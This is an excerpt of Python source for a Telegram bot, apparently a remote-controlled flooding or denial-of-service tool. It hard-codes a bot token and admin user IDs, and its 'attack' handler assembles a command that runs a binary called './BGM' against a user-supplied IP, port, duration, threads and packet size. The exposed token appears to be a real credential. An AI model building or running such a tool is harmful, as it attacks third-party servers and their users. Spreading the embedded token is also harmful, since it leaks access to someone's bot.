...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7440585688:AAEOdjV-4cCV3CCgwqh35P7H6lgPYZA2trs'
ADMIN_USER_ID = 6993424594 
ADMIN_USER_ID = 948895728 
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./BGM {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./BGM {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./BGM {ip} {port} {duration} {byte_size} {threads}"
